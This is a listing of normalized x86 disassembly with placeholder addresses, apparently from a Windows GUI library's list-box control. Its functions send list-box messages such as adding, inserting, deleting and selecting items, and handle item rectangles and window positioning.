mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4307b0
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_4307b8
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403454
jmp r-xdata
pop esi
retn
sub_430804
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4308c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
push 0x0
push edi
push 0x18a
mov eax esi
call sub_43f228
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_4324b8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4045dc
test esi esi
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a90
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax ebx
call sub_414378
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4308cf
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_404450
push eax
push edi
push 0x189
mov eax [ ebx + 0x10 ]
call sub_43f228
push eax
call SendMessageA
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4045dc
sub_4308d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43095b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffb1
call sub_403454
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4324d8
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430962
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a90
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_414378
sub_43096c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ esp + 0x4 ] eax
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb3
call sub_403454
mov [ esp + 0x8 ] eax
xor ecx ecx
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403454
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push 0x0
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ecx [ esp + 0x8 ]
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403454
mov edx [ esp + 0x4 ]
mov eax [ edi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4309ec
push esi
mov esi eax
cmp edx 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
mov eax [ esi + 0x10 ]
mov si 0xffb0
call sub_403454
sub_430a14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_430aa1
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430aa8
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
push 0x0
push 0x180
mov eax edi
call sub_43f228
push eax
call SendMessageA
mov esi eax
test esi esi
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
sub_430ab4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_430b3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430b44
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
push edi
push 0x181
mov eax esi
call sub_43f228
push eax
call SendMessageA
test eax eax
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
sub_430b5c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_430cac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430cb3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fb4
retn
mov eax [ ebp - 0x4 ]
call sub_4141fc
xor eax eax
push ebp
push sub_430c8a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403454
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov si 0xffb3
call sub_403454
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb2
call sub_403454
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403454
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4142b8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_430ccc
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_43f228
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_438f7c
sub_430d00
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
call sub_404450
push eax
push 0xffffffff
push 0x1a2
mov eax esi
call sub_43f228
push eax
call SendMessageA
mov edx edi
mov eax esi
call sub_432500
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_430d44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_430e43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430e4a
lea eax [ ebp - 0xc ]
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
call sub_4141fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x1
xor eax eax
push ebp
push sub_430e26
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4142b8
retn
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403454
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
xor ecx ecx
mov edx ebx
mov si 0xffb2
call sub_403454
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403454
sub_430e54
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43af54
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax ebx
call sub_4381fc
mov edx 0x61
mov eax ebx
call sub_438220
mov dl 0x1
mov eax ebx
call sub_43f45c
xor edx edx
mov eax ebx
call sub_438c04
mov [ ebx + 0x210 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x218 ] esi
mov [ esi + 0x10 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb00
mov esi eax
mov [ ebx + 0x228 ] esi
mov eax esi
mov edx ebx
call sub_43761c
mov [ ebx + 0x230 ] 0x10
mov [ ebx + 0x224 ] 0x1
mov [ ebx + 0x23b ] 0x1
mov [ ebx + 0x234 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_430f40
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43b078
mov eax [ esi + 0x228 ]
call sub_403258
mov eax [ esi + 0x218 ]
call sub_403258
mov eax [ esi + 0x240 ]
call sub_403258
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_430f88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404440
xor eax eax
push ebp
push sub_430ffb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404450
mov esi eax
mov eax esi
call sub_40833c
push eax
mov edx esi
lea eax [ ebp - 0x8 ]
pop ecx
call sub_404080
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x218 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431002
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
sub_43100c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x199
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43102c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x19a
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_431068
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x182
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_431088
push ebx
mov ebx eax
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
pop ebx
retn
push 0x0
push 0x0
push 0x184
mov eax ebx
call sub_43f228
push eax
call SendMessageA
sub_4310bc
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
xor ecx ecx
mov edx edi
mov eax esi
call sub_4314fc
inc edi
dec ebx
jne r-xdata
jmp r-xdata
sub_431104
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43121b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431222
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403fb4
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404450
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404188
mov eax [ ebp - 0x14 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0x218 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_404450
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404188
mov eax [ ebp - 0xc ]
push eax
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0xd4 ]
mov edx esi
mov eax ebx
call sub_4314ac
test al al
je r-xdata
jmp r-xdata
sub_43122c
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax esi
call sub_4314ac
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
sub_431298
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
jle r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
jle r-xdata
mov eax ebx
call sub_438444
mov [ esp ] eax
fild [ esp ]
fild [ ebx + 0x22c ]
fdivp st1
call sub_402a68
mov esi eax
cmp esi 0x1
jge r-xdata
push 0x0
push esi
push 0x195
mov eax ebx
call sub_43f228
push eax
call SendMessageA
mov esi 0x1
sub_4312ec
push ebx
mov ebx eax
cmp edx [ ebx + 0x22c ]
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_43c7c8
jmp r-xdata
test edx edx
jne r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_43f52c
test al al
je r-xdata
mov eax ebx
call sub_431298
sub_431330
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x188
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x19f
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop ebx
retn
sub_4313ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push esi
push 0x186
mov eax ebx
call sub_43f228
push eax
call SendMessageA
push 0x0
push esi
push 0x19e
mov eax ebx
call sub_43f228
push eax
call SendMessageA
jmp r-xdata
sub_4313f8
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x239 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x239 ] dl
mov eax ebx
call sub_43c7c8
mov eax ebx
mov si 0xffd0
call sub_403454
sub_431420
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x230 ]
mov eax ebx
call sub_43f52c
test al al
je r-xdata
mov eax esi
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov edx 0x198
mov eax ebx
call sub_439bf4
mov esi [ esp + 0xc ]
sub esi [ esp + 0x4 ]
sub_4314ac
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x187
mov eax ebx
call sub_43f228
push eax
call SendMessageA
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
sbb eax eax
inc eax
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
sub_4314fc
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x208 ] 0x0
je r-xdata
test bl bl
je r-xdata
push esi
xor eax eax
mov al bl
push eax
push 0x185
mov eax edi
call sub_43f228
push eax
call SendMessageA
inc eax
jne r-xdata
push 0x0
push 0xffffffff
push 0x186
mov eax edi
call sub_43f228
push eax
call SendMessageA
push 0x0
push esi
push 0x186
mov eax edi
call sub_43f228
push eax
call SendMessageA
inc eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
jmp r-xdata
sub_4315d0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
add al 0xfd
sub al 0x2
jae r-xdata
mov [ esi + 0x238 ] bl
mov eax esi
call sub_43c7c8
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax esi
call sub_4315ac
sub_431628
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4316d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4316d7
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f90
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_404450
mov edx eax
mov eax [ esi + 0x8 ]
call sub_408378
mov eax [ ebp - 0x4 ]
call sub_404250
mov [ esi + 0xc ] eax
jmp r-xdata
sub_4316dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431772
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431779
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f90
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_404250
mov [ esi + 0xc ] eax
jmp r-xdata
sub_431794
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43160c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x197
mov eax ebx
call sub_43f228
push eax
call SendMessageA
sub_4317c0
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub al 0x3
je r-xdata
xor edx edx
mov eax ebx
call sub_4315d0
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4315d0
jmp r-xdata
sub_431804
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x20 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
or ebp 0xffffffff
mov eax esi
call sub_43160c
mov ebp eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
cmp edi ebp
jle r-xdata
test bl bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx ebp
mov edx 0x198
mov eax esi
call sub_439bf4
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax ebp
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
cmp edi ebp
jg r-xdata
sub_431890
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test ebx ebx
je r-xdata
push edi
mov ecx ebx
mov edx 0x198
mov eax esi
call sub_439bf4
jmp r-xdata
cmp eax ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
cmp eax ebx
jne r-xdata
mov eax edi
xor ecx ecx
mov edx 0x10
call sub_402c64
push edi
mov ecx ebx
dec ecx
mov edx 0x198
mov eax esi
call sub_439bf4
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
push 0x0
push edi
call OffsetRect
jmp r-xdata
sub_4318f4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43c0b4
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_43bfe0
mov esi rw-data
cmp [ ebx + 0x23b ] 0x0
je r-xdata
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
setb dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
or edx 0x300000
or edx 0x1
or edx [ edi + 0x4 ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x23a ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x208 ]
or edx [ esi + eax * 4 ]
xor eax eax
mov al [ ebx + 0x239 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x22c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x224 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x23c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
mov [ edi + 0x4 ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov esi rw-data
mov eax ebx
mov si 0xffc8
call sub_403454
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
not eax
and [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_431a0c
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov eax ebx
call sub_43c1e0
push 0x14
push edi
push esi
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push 0x0
mov eax ebx
call sub_43f228
push eax
call SetWindowPos
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax ebx
call sub_431298
mov eax [ ebx + 0x234 ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebx + 0x23c ]
push eax
push 0x1
push 0x192
mov eax ebx
call sub_43f228
push eax
call SendMessageA
mov dl [ ebx + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov esi [ ebx + 0x240 ]
test esi esi
je r-xdata
mov edx eax
mov eax ebx
call sub_4323d4
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x244 ]
mov eax ebx
call sub_431794
mov edx [ ebx + 0x248 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
